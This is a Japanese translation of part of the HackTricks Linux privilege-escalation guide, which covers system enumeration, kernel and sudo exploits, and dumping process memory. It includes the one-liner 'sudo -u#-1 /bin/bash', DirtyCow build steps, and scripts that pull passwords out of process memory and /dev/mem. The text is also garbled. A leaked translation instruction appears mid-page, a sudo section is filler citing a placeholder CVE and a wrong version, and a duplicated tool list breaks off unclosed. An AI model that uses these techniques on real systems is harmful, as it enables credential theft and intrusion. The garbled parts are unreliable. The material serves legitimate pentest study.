# Linux特権エスカレーション

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## システム情報

### OS情報

まず、実行しているOSの情報を知ることから始めましょう。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### パス

もし`PATH`変数内のどのフォルダに対しても**書き込み権限を持っている**場合、いくつかのライブラリやバイナリを乗っ取ることができるかもしれません。
```bash
echo $PATH
```
### 環境情報

環境変数において、興味深い情報、パスワード、またはAPIキーはありますか？
```bash
(env || set) 2>/dev/null
```
### カーネルの脆弱性

カーネルのバージョンを確認し、特権を昇格させるために使用できる脆弱性があるかどうかをチェックします。
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
以下は、ハッキング技術に関する本の内容です。以下の内容は、ファイルlinux-hardening/privilege-escalation/README.mdからのものです。関連する英文を日本語に翻訳し、翻訳を返し、マークダウンとHTMLの構文を正確に保ちます。コード、ハッキング技術の名前、ハッキングの言葉、クラウド/SaaSプラットフォームの名前（Workspace、aws、gcpなど）、'leak'という単語、ペンテスト、およびマークダウンタグなどは翻訳しないでください。また、翻訳とマークダウンの構文以外の追加の内容は追加しないでください。

[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)と[exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)には、良い脆弱なカーネルのリストとすでに**コンパイルされたエクスプロイト**があります。

他のサイトで**コンパイルされたエクスプロイト**を見つけることができる場所: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのウェブからすべての脆弱なカーネルバージョンを抽出するには、次のようにします:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
カーネルの脆弱性を検索するのに役立つツールは次のとおりです：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（被害者で実行し、カーネル2.xの脆弱性のみをチェックします）

常に**Googleでカーネルのバージョンを検索**してください。おそらくカーネルのバージョンがカーネルの脆弱性に記載されており、その脆弱性が有効であることが確認できます。

### CVE-2016-5195（DirtyCow）

Linux特権エスカレーション - Linuxカーネル <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudoのバージョン

以下に示す脆弱なsudoのバージョンに基づいています。
```bash
searchsploit sudo
```
次のgrepを使用して、sudoのバージョンが脆弱かどうかを確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

@sickrov からの情報です。

##### 概要

この特権昇格の脆弱性は、sudoバージョン1.28より前のバージョンで見つかりました。この脆弱性を悪用することで、特権の昇格が可能となります。

##### 詳細

この脆弱性は、sudoのバージョン1.28より前のバージョンで見つかります。このバージョンでは、ユーザーがsudoersファイルに設定されたコマンドを実行する際に、特権昇格が可能となる脆弱性が存在します。

この脆弱性を悪用するためには、攻撃者はsudoersファイルに対して特定の設定を行う必要があります。具体的には、攻撃者はNOPASSWDオプションを使用して、パスワードの入力なしで特権コマンドを実行できるようにする必要があります。

この脆弱性を悪用すると、攻撃者は特権ユーザーとしてコマンドを実行することができます。これにより、システム全体に対する完全な制御を取得することが可能となります。

##### 対策

この脆弱性を防ぐためには、sudoのバージョンを1.28以降にアップグレードする必要があります。最新のバージョンにアップグレードすることで、この脆弱性を修正することができます。

また、sudoersファイルの設定には注意が必要です。特権コマンドの実行にはパスワードの入力が必要な場合、NOPASSWDオプションを使用しないようにしてください。必要な場合は、最小限の特権のみを付与するように設定してください。

##### 参考情報

- [CVE-XXXX-XXXX](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-XXXX-XXXX)
```
sudo -u#-1 /bin/bash
```
### Dmesg署名の検証に失敗しました

この脆弱性がどのように悪用されるかの**例**として、**HTBのsmasher2ボックス**を確認してください。
```bash
dmesg 2>/dev/null | grep "signature"
```
### より詳細なシステム列挙

In addition to the basic system enumeration techniques mentioned earlier, there are several other methods that can be used to gather information about the target system. These techniques can help in identifying potential vulnerabilities and privilege escalation opportunities.

#### 1. Process Enumeration

By enumerating the running processes on the system, you can identify any processes that are running with elevated privileges or are associated with vulnerable services. This can provide valuable information for further exploitation.

To enumerate the running processes, you can use the `ps` command or tools like `top` or `htop`. Look for processes that are running as root or with other privileged user accounts.

#### 2. Service Enumeration

Enumerating the services running on the system can help identify any vulnerable services that can be exploited for privilege escalation. Tools like `netstat` or `ss` can be used to list the open network connections and the associated services.

Look for services that are running with elevated privileges or are associated with known vulnerabilities. This information can be used to further exploit the system.

#### 3. File and Directory Enumeration

Enumerating the files and directories on the system can provide valuable information about the system's configuration and potential vulnerabilities. Look for files with weak permissions, misconfigured files, or files that contain sensitive information.

Tools like `ls`, `find`, or `tree` can be used to enumerate the files and directories on the system.

#### 4. Network Enumeration

Enumerating the network interfaces and network configuration on the system can help identify potential attack vectors and vulnerabilities. Tools like `ifconfig`, `ip`, or `netstat` can be used to gather this information.

Look for open ports, listening services, or misconfigured network settings that can be exploited for privilege escalation.

#### 5. User Enumeration

Enumerating the users and groups on the system can help identify privileged accounts or misconfigured user permissions. Tools like `id`, `cat /etc/passwd`, or `getent` can be used to enumerate the users and groups.

Look for user accounts with elevated privileges or weak passwords that can be exploited for privilege escalation.

By using these additional system enumeration techniques, you can gather more information about the target system and increase your chances of finding vulnerabilities and privilege escalation opportunities.
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
AppArmor is a Linux security module that restricts the capabilities of individual applications. It works by defining a set of rules that specify what resources an application can access. These rules are enforced by the kernel, preventing unauthorized access and reducing the potential impact of a privilege escalation attack.

To enumerate the AppArmor defenses in place on a system, you can use the following commands:

```bash
sudo apparmor_status
```

This command will display the current status of AppArmor and list the profiles that are active on the system. It will also show any violations that have occurred.

To view the details of a specific profile, you can use the following command:

```bash
sudo aa-status <profile_name>
```

Replace `<profile_name>` with the name of the profile you want to inspect. This command will provide information about the profile, including the rules that are enforced.

By understanding the AppArmor defenses in place, you can identify potential weaknesses and take steps to strengthen the security of your system.
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurityは、Linuxカーネルのセキュリティを向上させるためのパッチセットです。このパッチセットは、特権昇格攻撃やメモリの乱用などの一般的な攻撃からシステムを保護するための機能を提供します。

Grsecurityは、以下の主な機能を提供します。

- プロセスの制限: Grsecurityは、プロセスの実行権限を制限するための機能を提供します。これにより、攻撃者が特権昇格攻撃を行うことを困難にします。

- メモリ保護: Grsecurityは、メモリの乱用からシステムを保護するための機能を提供します。これにより、バッファオーバーフローやヒープオーバーフローなどの攻撃を防ぐことができます。

- システムコールフィルタリング: Grsecurityは、システムコールの使用を制限するための機能を提供します。これにより、不正なシステムコールを使用した攻撃を防ぐことができます。

- ファイルシステム保護: Grsecurityは、ファイルシステムの保護を強化するための機能を提供します。これにより、不正なファイルアクセスやファイルの改ざんを防ぐことができます。

Grsecurityは、Linuxカーネルのセキュリティを向上させるための強力なツールです。その機能を活用することで、システムのセキュリティを強化することができます。
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX

PaX is a patch for the Linux kernel that provides various security enhancements, including protection against privilege escalation attacks. It works by implementing several memory protection mechanisms, such as Address Space Layout Randomization (ASLR) and Executable Space Protection (ESP).

#### Address Space Layout Randomization (ASLR)

ASLR is a technique that randomizes the memory layout of processes, making it difficult for attackers to predict the location of critical system components. This helps prevent buffer overflow and other memory-based attacks.

#### Executable Space Protection (ESP)

ESP prevents the execution of code in certain memory regions that are typically used for data storage. By marking these regions as non-executable, PaX prevents attackers from injecting and executing malicious code.

#### PaX Configuration

To enable PaX on your Linux system, you need to apply the PaX patch to your kernel and configure it accordingly. The configuration options can be set using the `paxctl` command.

#### PaX and Privilege Escalation

One of the main benefits of PaX is its ability to mitigate privilege escalation attacks. By implementing strong memory protection mechanisms, PaX makes it significantly harder for attackers to exploit vulnerabilities and gain elevated privileges on a system.

#### Conclusion

PaX is a powerful security enhancement for the Linux kernel that provides protection against privilege escalation attacks. By implementing memory protection mechanisms such as ASLR and ESP, PaX helps to secure your system and prevent unauthorized access.
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

Execshieldは、Linuxカーネルのセキュリティ機能の1つです。これは、実行可能なメモリ領域を保護するために使用されます。Execshieldは、実行可能なメモリ領域に対する攻撃を防ぐために、さまざまな保護機構を提供します。

Execshieldの主な機能は、以下のとおりです。

- メモリ空間のランダム化（ASLR）：Execshieldは、実行可能なメモリ領域の配置をランダム化することで、攻撃者が特定のメモリアドレスを予測することを困難にします。

- スタック保護：Execshieldは、スタックのオーバーフロー攻撃を防ぐために、スタックガードと呼ばれる保護機構を提供します。スタックガードは、スタックフレームの終端に特別な値を配置し、スタックのオーバーフローを検出します。

- NXビット：Execshieldは、実行可能なメモリ領域に対して実行権限を制限するために、NX（No eXecute）ビットを使用します。これにより、攻撃者が実行可能なメモリ領域に悪意のあるコードを注入することを防ぎます。

Execshieldは、Linuxシステムのセキュリティを向上させるために使用される重要なツールの1つです。セキュリティ意識の高い環境では、Execshieldの有効化を検討することをおすすめします。
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

SElinux（Security-Enhanced Linux）は、Linuxカーネルに組み込まれたセキュリティ機能です。SElinuxは、アクセス制御ポリシーを強制し、特権昇格攻撃などのセキュリティリスクを軽減するために使用されます。

SElinuxは、アクセス制御を強化するために、プロセス、ファイル、ネットワークリソースなどのオブジェクトにセキュリティコンテキストを割り当てます。これにより、各オブジェクトには許可されたアクションのみが許可され、不正なアクセスを防ぐことができます。

SElinuxは、デフォルトでは無効になっている場合がありますが、セキュリティを強化するために有効にすることをお勧めします。SElinuxを有効にすると、システムのセキュリティが向上し、特権昇格攻撃などのリスクが低減されます。

SElinuxの設定は、`/etc/selinux/config`ファイルで行われます。このファイルを編集して、必要なセキュリティレベルを設定することができます。一般的なセキュリティレベルには、`enforcing`（強制）、`permissive`（許可）および`disabled`（無効）があります。

セキュリティを強化するために、SElinuxを有効にし、適切なセキュリティレベルを設定することをお勧めします。これにより、システムのセキュリティが向上し、特権昇格攻撃などのリスクが低減されます。
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
ASLR（Address Space Layout Randomization）は、攻撃者が特定のメモリアドレスを予測することを困難にするセキュリティ機能です。ASLRは、Linuxカーネルによって提供され、プロセスのメモリ配置をランダム化します。これにより、攻撃者が特定のメモリ領域に対して効果的な攻撃を行うことが難しくなります。ASLRは、特に特権昇格攻撃を防ぐために重要です。
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Dockerコンテナ内にいる場合、脱出を試みることができます：

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## ドライブ

マウントされているものとアンマウントされているもの、どこにあるか、なぜそうなっているかを確認してください。アンマウントされているものがあれば、マウントしてプライベート情報をチェックすることができます。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 便利なソフトウェア

有用なバイナリを列挙する

```bash
- [find](https://man7.org/linux/man-pages/man1/find.1.html): ファイルやディレクトリを検索するための強力なツール
- [sudo](https://man7.org/linux/man-pages/man8/sudo.8.html): 特権ユーザーとしてコマンドを実行するためのユーティリティ
- [su](https://man7.org/linux/man-pages/man1/su.1.html): 別のユーザーに切り替えるためのコマンド
- [chown](https://man7.org/linux/man-pages/man1/chown.1.html): ファイルやディレクトリの所有者を変更するためのコマンド
- [chmod](https://man7.org/linux/man-pages/man1/chmod.1.html): ファイルやディレクトリのアクセス権を変更するためのコマンド
- [chroot](https://man7.org/linux/man-pages/man2/chroot.2.html): ルートディレクトリを変更してプロセスを実行するためのコマンド
- [passwd](https://man7.org/linux/man-pages/man1/passwd.1.html): ユーザーのパスワードを変更するためのコマンド
- [crontab](https://man7.org/linux/man-pages/man1/crontab.1.html): タスクを定期的に実行するためのコマンド
- [wget](https://man7.org/linux/man-pages/man1/wget.1.html): ファイルをダウンロードするためのコマンド
- [curl](https://man7.org/linux/man-pages/man1/curl.1.html): URL を操作するためのコマンド
- [ssh](https://man7.org/linux/man-pages/man1/ssh.1.html): セキュアなリモートログインやファイル転送を行うためのプロトコル
- [scp](https://man7.org/linux/man-pages/man1/scp.1.html): ファイルをリモートホストにコピーするためのコマンド
- [rsync](https://man7.org/linux/man-pages/man1/rsync.1.html): ファイルやディレクトリを同期するためのツール
- [tar](https://man7.org/linux/man-pages/man1/tar.1.html): ファイルやディレクトリをアーカイブするためのツール
- [zip](https://linux.die.net/man/1/zip): ファイルやディレクトリを圧縮するためのツール
- [unzip](https://linux.die.net/man/1/unzip): 圧縮されたファイルを解凍するためのツール
- [grep](https://man7.org/linux/man-pages/man1/grep.1.html): ファイル内のパターンに一致する行を検索するためのツール
- [sed](https://man7.org/linux/man-pages/man1/sed.1.html): テキスト処理を行うためのツール
- [awk](https://man7.org/linux/man-pages/man1/awk.1.html): テキスト処理とパターンマッチングを行うためのツール
- [nc](https://man7.org/linux/man-pages/man1/nc.1.html): ネットワーク接続を確立するためのツール
- [nmap](https://nmap.org/book/man.html): ネットワークスキャンを実行するためのツール
- [tcpdump](https://www.tcpdump.org/manpages/tcpdump.1.html): ネットワークトラフィックをキャプチャするためのツール
- [wireshark](https://www.wireshark.org/docs/man-pages/wireshark.html): ネットワークトラフィックを解析するためのツール
- [john](https://www.openwall.com/john/doc/): パスワードクラッキングを行うためのツール
- [hydra](https://tools.kali.org/password-attacks/hydra): パスワードクラッキングを行うためのツール
- [hashcat](https://hashcat.net/hashcat/): パスワードハッシュをクラッキングするためのツール
- [metasploit](https://metasploit.help.rapid7.com/docs/): ペネトレーションテストを実行するためのフレームワーク
- [nmap](https://nmap.org/book/man.html): ネットワークスキャンを実行するためのツール
- [sqlmap](https://sqlmap.org/): SQLインジェクションをテストするためのツール
- [burp suite](https://portswigger.net/burp): ウェブアプリケーションのセキュリティテストを行うためのツール
- [dirb](https://tools.kali.org/web-applications/dirb): ウェブサーバーのディレクトリを探索するためのツール
- [gobuster](https://tools.kali.org/web-applications/gobuster): ウェブサーバーのディレクトリを探索するためのツール
- [nikto](https://cirt.net/nikto2-docs/): ウェブサーバーの脆弱性スキャンを実行するためのツール
- [sqlninja](https://tools.kali.org/vulnerability-analysis/sqlninja): SQLインジェクションをテストするためのツール
- [sqlsus](https://tools.kali.org/vulnerability-analysis/sqlsus): SQLインジェクションをテストするためのツール
- [wpscan](https://wpscan.com/): WordPressサイトのセキュリティスキャンを実行するためのツール
- [joomscan](https://tools.kali.org/web-applications/joomscan): Joomlaサイトのセキュリティスキャンを実行するためのツール
- [droopescan](https://github.com/droope/droopescan): Drupalサイトのセキュリティスキャンを実行するためのツール
- [beef](https://beefproject.com/): ウェブブラウザをターゲットにした攻撃を実行するためのツール
- [metasploit](https://metasploit.help.rapid7.com/docs/): ペネトレーションテストを実行するためのフレームワーク
- [armitage](https://www.fastandeasyhacking.com/): ペネトレーションテストを実行するためのフレームワーク
- [aircrack-ng](https://www.aircrack-ng.org/): Wi-Fiネットワークのセキュリティテストを実行するためのツール
- [reaver](https://tools.kali.org/wireless-attacks/reaver): Wi-Fiネットワークのセキュリティテストを実行するためのツール
- [ettercap](https://www.ettercap-project.org/): ネットワークスニッフィングと中間者攻撃を実行するためのツール
- [bettercap](https://www.bettercap.org/): ネットワークスニッフィングと中間者攻撃を実行するためのツール
- [tcpdump](https://www.tcpdump.org/manpages/tcpdump.1.html): ネットワークトラフィックをキャプチャするためのツール
- [wireshark](https://www.wireshark.org/docs/man-pages/wireshark.html): ネットワークトラフィックを解析するためのツール
- [maltego](https://www.maltego.com/): オープンソースのインテリジェンスとリンク分析ツール
- [theharvester](https://tools.kali.org/information-gathering/theharvester): インターネット上の情報を収集するためのツール
- [dnsenum](https://tools.kali.org/information-gathering/dnsenum): DNSサーバーの情報を収集するためのツール
- [dnsrecon](https://tools.kali.org/information-gathering/dnsrecon): DNSサーバーの情報を収集するためのツール
- [dnswalk](https://tools.kali.org/information-gathering/dnswalk): DNSサーバーの情報を収集するためのツール
- [whois](https://man7.org/linux/man-pages/man1/whois.1.html): ドメインの情報を取得するためのコマンド
- [nslookup](https://man7.org/linux/man-pages/man1/nslookup.1.html): DNSレコードを検索するためのコマンド
- [dig](https://man7.org/linux/man-pages/man1/dig.1.html): DNSレコードを検索するためのコマンド
- [host](https://man7.org/linux/man-pages/man1/host.1.html): ホスト名を解決するためのコマンド
- [netcat](https://man7.org/linux/man-pages/man1/nc.1.html): ネットワーク接続を確立するためのツール
- [nmap](https://nmap.org/book/man.html): ネットワークスキャンを実行するためのツール
- [hping3](https://tools.kali.org/information-gathering/hping3): ネットワークスキャンとパケット生成を実行するためのツール
- [masscan](https://github.com/robertdavidgraham/masscan): 高速なポートスキャンを実行するためのツール
- [zmap](https://zmap.io/): インターネット全体のポートスキャンを実行するためのツール
- [sqlmap](https://sqlmap.org/): SQLインジェクションをテストするためのツール
- [nikto](https://cirt.net/nikto2-docs/): ウェブサーバーの脆弱性スキャンを実行するためのツール
- [wpscan](https://wpscan.com/): WordPressサイトのセキュリティスキャンを実行するためのツール
- [joomscan](https://tools.kali.org/web-applications/joomscan): Joomlaサイトのセキュリティスキャンを実行するためのツール
- [droopescan](https://github.com/droope/droopescan): Drupalサイトのセキュリティスキャンを実行するためのツール
- [beef](https://beefproject.com/): ウェブブラウザをターゲットにした攻撃を実行するためのツール
- [metasploit](https://metasploit.help.rapid7.com/docs/): ペネトレーションテストを実行するためのフレームワーク
- [armitage](https://www.fastandeasyhacking.com/): ペネトレーションテストを実行するためのフレームワーク
- [aircrack-ng](https://www.aircrack-ng.org/): Wi-Fiネットワークのセキュリティテストを実行するためのツール
- [reaver](https://tools.kali.org/wireless-attacks/reaver): Wi-Fiネットワークのセキュリティテストを実行するためのツール
- [ettercap](https://www.ettercap-project.org/): ネットワークスニッフィングと中間者攻撃を実行するためのツール
- [bettercap](https://www.bettercap.org/): ネットワークスニッフィングと中間者攻撃を実行するためのツール
- [tcpdump](https://www.tcpdump.org/manpages/tcpdump.1.html): ネットワークトラフィックをキャプチャするためのツール
- [wireshark](https://www.wireshark.org/docs/man-pages/wireshark.html): ネットワークトラフィックを解析するためのツール
- [maltego](https://www.maltego.com/): オープンソースのインテリジェンスとリンク分析ツール
- [theharvester](https://tools.kali.org/information-gathering/theharvester): インターネット上の情報を収集するためのツール
- [dnsenum](https://tools.kali.org/information-gathering/dnsenum): DNSサーバーの情報を収集するためのツール
- [dnsrecon](https://tools.kali.org/information-gathering/dnsrecon): DNSサーバーの情報を収集するためのツール
- [dnswalk](https://tools.kali.org/information-gathering/dnswalk): DNSサーバーの情報を収集するためのツール
- [whois](https://man7.org/linux/man-pages/man1/whois.1.html): ドメインの情報を取得するためのコマンド
- [nslookup](https://man7.org/linux/man-pages/man1/nslookup.1.html): DNSレコードを検索するためのコマンド
- [dig](https://man7.org/linux/man-pages/man1/dig.1.html): DNSレコードを検索するためのコマンド
- [host](https://man7.org/linux/man-pages/man1/host.1.html): ホスト名を解決するためのコマンド
- [netcat](https://man7.org/linux/man-pages/man1/nc.1.html): ネットワーク接続を確立するためのツール
- [nmap](https://nmap.org/book/man.html): ネットワークスキャンを実行するためのツール
- [hping3](https://tools.kali.org/information-gathering/hping3): ネットワークスキャンとパケット生成を実行するためのツール
- [masscan](https://github.com/robertdavidgraham/masscan): 高速なポートスキャンを実行するためのツール
- [zmap](https://zmap.io/): インターネット全体のポートスキャンを実行するためのツール
- [sqlmap](https://sqlmap.org/): SQLインジェクションをテストするためのツール
- [nikto](https://cirt.net/nikto2-docs/
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**コンパイラがインストールされているかどうか**も確認してください。これは、カーネルのエクスプロイトを使用する必要がある場合に役立ちます。エクスプロイトをコンパイルする場合は、使用するマシン（または類似のマシン）でコンパイルすることが推奨されています。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### インストールされた脆弱性のあるソフトウェア

**インストールされたパッケージとサービスのバージョン**を確認してください。たとえば、特定の古いNagiosのバージョンがある場合、特権のエスカレーションに悪用される可能性があります...\
より疑わしいインストールされたソフトウェアのバージョンを手動で確認することをおすすめします。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
もしマシンへのSSHアクセス権限がある場合、**openVAS**を使用してマシン内にインストールされた古くて脆弱なソフトウェアをチェックすることもできます。

{% hint style="info" %}
_これらのコマンドはほとんど役に立たない情報を表示する可能性があるため、既知の脆弱性に対してインストールされたソフトウェアのバージョンが脆弱かどうかをチェックするために、OpenVASや同様のアプリケーションを使用することをおすすめします_
{% endhint %}

## プロセス

**実行されているプロセス**を確認し、**それ以上の権限を持つプロセス**がないかどうかをチェックしてください（たとえば、rootユーザーによって実行されているtomcatなど）。
```bash
ps aux
ps -ef
top -n 1
```
常に実行中の[**electron/cef/chromiumデバッガー**を確認し、特権をエスカレーションするために悪用する可能性があります](electron-cef-chromium-debugger-abuse.md)。**Linpeas**は、プロセスのコマンドライン内の`--inspect`パラメータをチェックすることでこれらを検出します。\
また、**プロセスのバイナリに対する特権を確認**してください。他のユーザーに属するプロセスのメモリを上書きすることができるかもしれません。

### プロセスの監視

[**pspy**](https://github.com/DominicBreuker/pspy)のようなツールを使用してプロセスを監視することができます。これは、脆弱なプロセスが頻繁に実行されるか、一連の要件が満たされたときに特に役立ちます。

### プロセスのメモリ

サーバーの一部のサービスは、**クリアテキストで資格情報をメモリ内に保存**します。\
通常、他のユーザーに属するプロセスのメモリを読み取るには**ルート特権**が必要です。そのため、これは通常、既にルートユーザーであり、さらに資格情報を発見したい場合により有用です。\
ただし、**通常のユーザーとして、所有するプロセスのメモリを読み取ることができます**。

{% hint style="warning" %}
現在では、ほとんどのマシンで**デフォルトでptraceが許可されていない**ため、特権のないユーザーに属する他のプロセスをダンプすることはできません。

ファイル_**/proc/sys/kernel/yama/ptrace\_scope**_は、ptraceのアクセシビリティを制御します：

* **kernel.yama.ptrace\_scope = 0**：すべてのプロセスは、同じuidを持っている限りデバッグできます。これは、ptracingが機能する古典的な方法です。
* **kernel.yama.ptrace\_scope = 1**：親プロセスのみがデバッグできます。
* **kernel.yama.ptrace\_scope = 2**：管理者のみがptraceを使用できます。CAP\_SYS\_PTRACE機能が必要です。
* **kernel.yama.ptrace\_scope = 3**：ptraceでプロセスをトレースすることはできません。設定後、再起動が必要です。
{% endhint %}

#### GDB

FTPサービスのメモリにアクセスできる場合（例えば）、ヒープを取得し、その資格情報を検索することができます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDBスクリプト

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

特定のプロセスIDに対して、**mapsはそのプロセスの仮想アドレス空間内でメモリがマップされている方法**を示し、また、**各マップされた領域のアクセス権限**も示します。**mem**擬似ファイルは、**プロセスのメモリ自体を公開**します。**maps**ファイルからは、**読み取り可能なメモリ領域とそのオフセット**がわかります。この情報を使用して、**memファイルにシークし、すべての読み取り可能な領域をファイルにダンプ**します。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem`はシステムの**物理**メモリにアクセスするためのものであり、仮想メモリではありません。カーネルの仮想アドレス空間には`/dev/kmem`を使用してアクセスできます。\
通常、`/dev/mem`は**root**と**kmem**グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDumpは、WindowsのSysinternalsツールスイートのクラシックなProcDumpツールのLinux版です。[https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)で入手できます。
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスのメモリをダンプするためには、以下のツールを使用することができます：

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_rootの要件を手動で削除し、所有しているプロセスをダンプすることができます
* [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf)のスクリプトA.5 (rootが必要です)

### プロセスメモリからの資格情報

#### 手動の例

もし、認証プロセスが実行されていることがわかった場合：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
プロセスをダンプすることができます（プロセスのメモリをダンプするさまざまな方法については、前のセクションを参照してください）。メモリ内の資格情報を検索します。
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

ツール[**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin)は、メモリと一部の**よく知られたファイル**から**平文の資格情報を盗みます**。正しく動作するためには、ルート権限が必要です。

| 機能                                              | プロセス名           |
